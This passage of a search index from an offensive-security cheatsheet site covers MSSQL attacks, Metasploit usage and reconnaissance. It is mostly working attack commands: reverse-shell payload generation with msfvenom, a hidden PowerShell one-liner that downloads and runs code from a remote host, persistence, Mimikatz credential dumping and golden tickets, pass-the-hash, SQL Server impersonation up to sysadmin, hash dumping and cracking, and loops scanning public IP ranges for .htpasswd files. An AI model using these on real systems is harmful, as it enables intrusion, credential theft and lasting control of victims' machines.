N'test_powershell_job1'; -- delete EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';","title":"Execute commands through SQL Agent Job service"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-jobs","text":"SELECT job_id, [name] FROM msdb.dbo.sysjobs; SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id Get-SQLAgentJob -Instance \"<DBSERVERNAME\\DBInstance>\" -username sa -Password Password1234 -Verbose","title":"List All Jobs"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#external-scripts","text":":warning: You need to enable external scripts . sp_configure 'external scripts enabled', 1; RECONFIGURE;","title":"External Scripts"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#python","text":"Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])' WITH RESULT SETS (([cmd_out] nvarchar(max)))","title":"Python:"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#r","text":"Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system(\"cmd.exe /c dir\",intern=T))' WITH RESULT SETS (([cmd_out] text)); GO @script=N'OutputDataSet <-data.frame(shell(\"dir\",intern=T))'","title":"R"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#audit-checks","text":"","title":"Audit Checks"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-and-exploit-impersonation-opportunities","text":"Impersonate as: EXECUTE AS LOGIN = 'sa' Impersonate dbo with DB_OWNER sql SQL> select is_member('db_owner'); SQL> execute as user = 'dbo' SQL> SELECT is_srvrolemember('sysadmin') Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug","title":"Find and exploit impersonation opportunities"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-databases-that-have-been-configured-as-trustworthy","text":"Invoke-SQLAuditPrivTrustworthy -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound. Invoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist","title":"Find databases that have been configured as trustworthy"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#manual-sql-server-queries","text":"","title":"Manual SQL Server Queries"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#query-current-user-determine-if-the-user-is-a-sysadmin","text":"select suser_sname() Select system_user select is_srvrolemember('sysadmin')","title":"Query Current User &amp; determine if the user is a sysadmin"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#current-role","text":"Select user","title":"Current Role"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#current-db","text":"select db_name()","title":"Current DB"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-tables","text":"select table_name from information_schema.tables","title":"List all tables"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-databases","text":"select name from master..sysdatabases","title":"List all databases"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#all-logins-on-server","text":"Select * from sys.server_principals where type_desc != 'SERVER_ROLE'","title":"All Logins on Server"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#all-database-users-for-a-database","text":"Select * from sys.database_principals where type_desc != 'database_role';","title":"All Database Users for a Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-sysadmins","text":"SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1","title":"List All Sysadmins"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-database-roles","text":"SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = 'R' ORDER BY DB1.name;","title":"List All Database Roles"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#effective-permissions-from-the-server","text":"select * from fn_my_permissions(null, 'server');","title":"Effective Permissions from the Server"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#effective-permissions-from-the-database","text":"SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');","title":"Effective Permissions from the Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-sql-server-logins-which-can-be-impersonated-for-the-current-database","text":"select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'","title":"Find SQL Server Logins Which can be Impersonated for the Current Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#exploiting-impersonation","text":"SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'adminuser' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN()","title":"Exploiting Impersonation"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#exploiting-nested-impersonation","text":"SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'stduser' SELECT SYSTEM_USER EXECUTE AS LOGIN = 'sa' SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER","title":"Exploiting Nested Impersonation"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#mssql-accounts-and-hashes","text":"MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins Then crack passwords using Hashcat : hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force 131 MSSQL (2000) 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 132 MSSQL (2005) 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe 1731 MSSQL (2012, 2014) 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375","title":"MSSQL Accounts and Hashes"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#references","text":"PowerUpSQL Cheat Sheet & SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017 MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016","title":"References"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/","text":"Metasploit Summary Installation Sessions Background handler Meterpreter - Basic Generate a meterpreter Meterpreter Webdelivery Get System Persistence Startup Network Monitoring Portforward Upload / Download Execute from Memory Mimikatz Pass the Hash - PSExec Use SOCKS Proxy Scripting Metasploit Multiple transports Best of - Exploits References Installation curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall or docker sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit Sessions CTRL+Z -> Session in Background sessions -> List sessions sessions -i session_number -> Interact with Session with id sessions -u session_number -> Upgrade session to a meterpreter sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> Upgrade session to a meterpreter sessions -c cmd -> Execute a command on several sessions sessions -i 10-20 -c \"id\" -> Execute a command on several sessions Background handler ExitOnSession : the handler will not exit if the meterpreter dies. screen -dRR sudo msfconsole use exploit/multi/handler set PAYLOAD generic/shell_reverse_tcp set LHOST 0.0.0.0 set LPORT 4444 set ExitOnSession false generate -o /tmp/meterpreter.exe -f exe to_handler [ctrl+a] + [d] Meterpreter - Basic Generate a meterpreter $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf > shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f exe > shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f macho > shell.macho $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f asp > shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war > shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.pl Meterpreter Webdelivery Set up a Powershell web delivery listening on port 8080. use exploit/multi/script/web_delivery set TARGET 2 set payload windows/x64/meterpreter/reverse_http set LHOST 10.0.0.1 set LPORT 4444 run powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB'); Get System meterpreter > getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM Persistence Startup OPTIONS: -A Automatically start a matching exploit/multi/handler to connect to the agent -L <opt> Location in target host to write payload to, if none %TEMP% will be used. -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp. -S Automatically start the agent on boot as a service (with SYSTEM privileges) -T <opt> Alternate executable template to use -U Automatically start the agent when the User logs on -X Automatically start the agent when the system boots -h This help menu -i <opt> The interval in seconds between each connection attempt -p <opt> The port on which the system running Metasploit is listening -r <opt> The IP of the system running Metasploit listening for the connect back meterpreter > run persistence -U -p 4242 Network Monitoring # list interfaces run packetrecorder -li # record interface n\u00b01 run packetrecorder -i 1 Portforward portfwd add -l 7777 -r 172.17.0.2 -p 3006 Upload / Download upload /path/in/hdd/payload.exe exploit.exe download /path/in/victim Execute from Memory execute -H -i -c -m -d calc.exe -f /root/wce.exe -a -w Mimikatz load mimikatz mimikatz_command -f version mimikatz_command -f samdump::hashes mimikatz_command -f sekurlsa::wdigest mimikatz_command -f sekurlsa::searchPasswords mimikatz_command -f sekurlsa::logonPasswords full load kiwi creds_all golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck> Pass the Hash - PSExec msf > use exploit/windows/smb/psexec msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp msf exploit(psexec) > exploit SMBDomain WORKGROUP no The Windows domain to use for authentication SMBPass 598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf no The password for the specified username SMBUser Lambda no The username to authenticate as Use SOCKS Proxy setg Proxies socks4:127.0.0.1:1080 Scripting Metasploit Using a .rc file , write the commands to execute, then run msfconsole -r ./file.rc . Here is a simple example to script the deployment of a handler an create an Office doc with macro. use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_https set LHOST 0.0.0.0 set LPORT 4646 set ExitOnSession false exploit -j -z use exploit/multi/fileformat/office_word_macro set PAYLOAD windows/meterpreter/reverse_https set LHOST 10.10.14.22 set LPORT 4646 exploit Multiple transports msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe Then, in AddTransports.ps1 Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30 Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30 Best of - Exploits MS17-10 Eternal Blue - exploit/windows/smb/ms17_010_eternalblue MS08_67 - exploit/windows/smb/ms08_067_netapi References Multiple transports in a meterpreter payload - ionize Creating Metasploit Payloads - Peleus","title":"Metasploit"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#metasploit","text":"","title":"Metasploit"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#summary","text":"Installation Sessions Background handler Meterpreter - Basic Generate a meterpreter Meterpreter Webdelivery Get System Persistence Startup Network Monitoring Portforward Upload / Download Execute from Memory Mimikatz Pass the Hash - PSExec Use SOCKS Proxy Scripting Metasploit Multiple transports Best of - Exploits References","title":"Summary"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#installation","text":"curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall or docker sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit","title":"Installation"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#sessions","text":"CTRL+Z -> Session in Background sessions -> List sessions sessions -i session_number -> Interact with Session with id sessions -u session_number -> Upgrade session to a meterpreter sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> Upgrade session to a meterpreter sessions -c cmd -> Execute a command on several sessions sessions -i 10-20 -c \"id\" -> Execute a command on several sessions","title":"Sessions"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#background-handler","text":"ExitOnSession : the handler will not exit if the meterpreter dies. screen -dRR sudo msfconsole use exploit/multi/handler set PAYLOAD generic/shell_reverse_tcp set LHOST 0.0.0.0 set LPORT 4444 set ExitOnSession false generate -o /tmp/meterpreter.exe -f exe to_handler [ctrl+a] + [d]","title":"Background handler"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#meterpreter-basic","text":"","title":"Meterpreter - Basic"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#generate-a-meterpreter","text":"$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf > shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f exe > shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f macho > shell.macho $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f asp > shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war > shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.pl","title":"Generate a meterpreter"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#meterpreter-webdelivery","text":"Set up a Powershell web delivery listening on port 8080. use exploit/multi/script/web_delivery set TARGET 2 set payload windows/x64/meterpreter/reverse_http set LHOST 10.0.0.1 set LPORT 4444 run powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');","title":"Meterpreter Webdelivery"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#get-system","text":"meterpreter > getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM","title":"Get System"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#persistence-startup","text":"OPTIONS: -A Automatically start a matching exploit/multi/handler to connect to the agent -L <opt> Location in target host to write payload to, if none %TEMP% will be used. -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp. -S Automatically start the agent on boot as a service (with SYSTEM privileges) -T <opt> Alternate executable template to use -U Automatically start the agent when the User logs on -X Automatically start the agent when the system boots -h This help menu -i <opt> The interval in seconds between each connection attempt -p <opt> The port on which the system running Metasploit is listening -r <opt> The IP of the system running Metasploit listening for the connect back meterpreter > run persistence -U -p 4242","title":"Persistence Startup"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#network-monitoring","text":"# list interfaces run packetrecorder -li # record interface n\u00b01 run packetrecorder -i 1","title":"Network Monitoring"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#portforward","text":"portfwd add -l 7777 -r 172.17.0.2 -p 3006","title":"Portforward"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#upload-download","text":"upload /path/in/hdd/payload.exe exploit.exe download /path/in/victim","title":"Upload / Download"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#execute-from-memory","text":"execute -H -i -c -m -d calc.exe -f /root/wce.exe -a -w","title":"Execute from Memory"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#mimikatz","text":"load mimikatz mimikatz_command -f version mimikatz_command -f samdump::hashes mimikatz_command -f sekurlsa::wdigest mimikatz_command -f sekurlsa::searchPasswords mimikatz_command -f sekurlsa::logonPasswords full load kiwi creds_all golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>","title":"Mimikatz"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#pass-the-hash-psexec","text":"msf > use exploit/windows/smb/psexec msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp msf exploit(psexec) > exploit SMBDomain WORKGROUP no The Windows domain to use for authentication SMBPass 598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf no The password for the specified username SMBUser Lambda no The username to authenticate as","title":"Pass the Hash - PSExec"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#use-socks-proxy","text":"setg Proxies socks4:127.0.0.1:1080","title":"Use SOCKS Proxy"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#scripting-metasploit","text":"Using a .rc file , write the commands to execute, then run msfconsole -r ./file.rc . Here is a simple example to script the deployment of a handler an create an Office doc with macro. use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_https set LHOST 0.0.0.0 set LPORT 4646 set ExitOnSession false exploit -j -z use exploit/multi/fileformat/office_word_macro set PAYLOAD windows/meterpreter/reverse_https set LHOST 10.10.14.22 set LPORT 4646 exploit","title":"Scripting Metasploit"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#multiple-transports","text":"msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe Then, in AddTransports.ps1 Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30 Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30","title":"Multiple transports"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#best-of-exploits","text":"MS17-10 Eternal Blue - exploit/windows/smb/ms17_010_eternalblue MS08_67 - exploit/windows/smb/ms08_067_netapi","title":"Best of - Exploits"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#references","text":"Multiple transports in a meterpreter payload - ionize Creating Metasploit Payloads - Peleus","title":"References"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/","text":"Bug Hunting Methodology and Enumeration Summary Passive Recon Shodan Wayback Machine The Harvester Active Recon Network discovery RPCClient Enum4all List all the subdirectories and files Gobuster Backup File Artifacts Checker Web Vulnerabilities Repository Github Burp Web Checklist Nikto Payment functionality Passive recon Using Shodan (https://www.shodan.io/) to detect similar app bash can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse) nmap --script shodan-hq.nse --script-args 'apikey=<yourShodanAPIKey>,target=<hackme>' Using The Wayback Machine (https://archive.org/web/) to detect forgotten endpoints bash look for JS files, old links curl -sX GET \"http://web.archive.org/cdx/search/cdx?url=<targetDomain.com>&output=text&fl=original&collapse=urlkey&matchType=prefix\" Using The Harvester (https://github.com/laramies/theHarvester) python python theHarvester.py -b all -d domain.com Active recon Network discovery with masscan, nmap etc. rpcclient ```bash $ rpcclient -U '%' [target host] rpcclient $> querydominfo Domain: WORKGROUP Server: METASPLOITABLE Comment: metasploitable server (Samba 3.0.20-Debian) Total Users: 35 rpcclient $> enumdomusers user:[games] rid:[0x3f2] user:[nobody] rid:[0x1f5] user:[bind] rid:[0x4ba] ``` enum4linux bash enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/) Usage: ./enum4linux.pl [options] ip -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default \u201c\u201d) -p pass specify password to use (default \u201c\u201d -a Do all simple enumeration (-U -S -G -P -r -o -n -i). -o Get OS information -i Get printer information ============================== | Users on XXX.XXX.XXX.XXX | ============================== index: 0x1 Account: games Name: games Desc: (null) index: 0x2 Account: nobody Name: nobody Desc: (null) index: 0x3 Account: bind Name: (null) Desc: (null) index: 0x4 Account: proxy Name: proxy Desc: (null) index: 0x5 Account: syslog Name: (null) Desc: (null) index: 0x6 Account: user Name: just a user,111,, Desc: (null) index: 0x7 Account: www-data Name: www-data Desc: (null) index: 0x8 Account: root Name: root Desc: (null) Zone Transfer ```powershell host -t ns domain.local domain.local name server master.domain.local. host master.domain.local master.domain.local has address 192.168.1.1 dig axfr domain.local @192.168.1.1 ``` List all the subdirectories and files Using BFAC (Backup File Artifacts Checker): An automated tool that checks for backup artifacts that may disclose the web-application's source code. ```bash git clone https://github.com/mazen160/bfac Check a single URL bfac --url http://example.com/test.php --level 4 Check a list of URLs bfac --list testing_list.txt ``` Using DirBuster or GoBuster ```bash ./gobuster -u http://buffered.io/ -w words.txt -t 10 -u url -w wordlist -t threads More subdomain : ./gobuster -m dns -w subdomains.txt -u google.com -i gobuster -w wordlist -u URL -r -e ``` Using a script to detect all phpinfo.php files in a range of IPs (CIDR can be found with a whois) bash #!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/phpinfo.php; done & Using a script to detect all .htpasswd files in a range of IPs bash #!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/.htpasswd; done & Looking for Web vulnerabilities Look for private information in GitHub repos with GitRob bash git clone https://github.com/michenriksen/gitrob.git gitrob analyze johndoe --site=https://github.acme.com --endpoint=https://github.acme.com/api/v3 --access-tokens=token1,token2 Explore the website with a proxy (ZAP/Burp Suite) Start proxy, visit the main target site and perform a Forced Browse to discover files and directories Map technologies used with Wappalyzer and Burp Suite (or ZAP) proxy Explore and understand available functionality, noting areas that correspond to vulnerability types ```bash Burp Proxy configuration on port 8080 (in .bashrc): alias set_proxy_burp='gsettings set org.gnome.system.proxy.http host \"http://localhost\";gsettings set org.gnome.system.proxy.http port 8080;gsettings set org.gnome.system.proxy mode \"manual\"' alias set_proxy_normal='gsettings set org.gnome.system.proxy mode \"none\"' then launch Burp with : java -jar burpsuite_free_v*.jar & ``` WAHH Task Checklist copied from http://mdsec.net/wahh/tasks.html Subscribe to the site and pay for the additional functionality to test Launch a Nikto scan in case you missed something powershell nikto -h http://domain.example.com Payment functionality - @gwendallecoguic if the webapp you're testing uses an external payment gateway, check the doc to find the test credit numbers, purchase something and if the webapp didn't disable the test mode, it will be free From https://stripe.com/docs/testing#cards : \"Use any of the following test card numbers, a valid expiration date in the future, and any random CVC number, to create a successful payment. Each test card's billing country is set to U.S. \" e.g : Test card numbers and tokens NUMBER BRAND TOKEN 4242424242424242 Visa tok_visa 4000056655665556 Visa (debit) tok_visa_debit 5555555555554444 Mastercard tok_mastercard International test card numbers and tokens NUMBER TOKEN COUNTRY BRAND 4000000400000008 tok_at Austria (AT) Visa 4000000560000004 tok_be Belgium (BE) Visa 4000002080000001 tok_dk Denmark (DK) Visa 4000002460000001 tok_fi Finland (FI) Visa 4000002500000003 tok_fr France (FR) Visa References [BugBounty] Yahoo phpinfo.php disclosure - Patrik Fehrenbach Nmap CheatSheet - HackerTarget","title":"Bug Hunting Methodology and Enumeration"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#bug-hunting-methodology-and-enumeration","text":"","title":"Bug Hunting Methodology and Enumeration"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#summary","text":"Passive Recon Shodan Wayback Machine The Harvester Active Recon Network discovery RPCClient Enum4all List all the subdirectories and files Gobuster Backup File Artifacts Checker Web Vulnerabilities Repository Github Burp Web Checklist Nikto Payment functionality","title":"Summary"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#passive-recon","text":"Using Shodan (https://www.shodan.io/) to detect similar app bash can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse) nmap --script shodan-hq.nse --script-args 'apikey=<yourShodanAPIKey>,target=<hackme>' Using The Wayback Machine (https://archive.org/web/) to detect forgotten endpoints bash look for JS files, old links curl -sX GET \"http://web.archive.org/cdx/search/cdx?url=<targetDomain.com>&output=text&fl=original&collapse=urlkey&matchType=prefix\" Using The Harvester (https://github.com/laramies/theHarvester) python python theHarvester.py -b all -d domain.com","title":"Passive recon"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#active-recon","text":"Network discovery with masscan, nmap etc. rpcclient ```bash $ rpcclient -U '%' [target host] rpcclient $> querydominfo Domain: WORKGROUP Server: METASPLOITABLE Comment: metasploitable server (Samba 3.0.20-Debian) Total Users: 35 rpcclient $> enumdomusers user:[games] rid:[0x3f2] user:[nobody] rid:[0x1f5] user:[bind] rid:[0x4ba] ``` enum4linux bash enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/) Usage: ./enum4linux.pl [options] ip -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default \u201c\u201d) -p pass specify password to use (default \u201c\u201d -a Do all simple enumeration (-U -S -G -P -r -o -n -i). -o Get OS information -i Get printer information ============================== | Users on XXX.XXX.XXX.XXX | ============================== index: 0x1 Account: games Name: games Desc: (null) index: 0x2 Account: nobody Name: nobody Desc: (null) index: 0x3 Account: bind Name: (null) Desc: (null) index: 0x4 Account: proxy Name: proxy Desc: (null) index: 0x5 Account: syslog Name: (null) Desc: (null) index: 0x6 Account: user Name: just a user,111,, Desc: (null) index: 0x7 Account: www-data Name: www-data Desc: (null) index: 0x8 Account: root Name: root Desc: (null) Zone Transfer ```powershell host -t ns domain.local domain.local name server master.domain.local. host master.domain.local master.domain.local has address 192.168.1.1 dig axfr domain.local @192.168.1.1 ```","title":"Active recon"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#list-all-the-subdirectories-and-files","text":"Using BFAC (Backup File Artifacts Checker): An automated tool that checks for backup artifacts that may disclose the web-application's source code. ```bash git clone https://github.com/mazen160/bfac Check a single URL bfac --url http://example.com/test.php --level 4 Check a list of URLs bfac --list testing_list.txt ``` Using DirBuster or GoBuster ```bash ./gobuster -u http://buffered.io/ -w words.txt -t 10 -u url -w wordlist -t 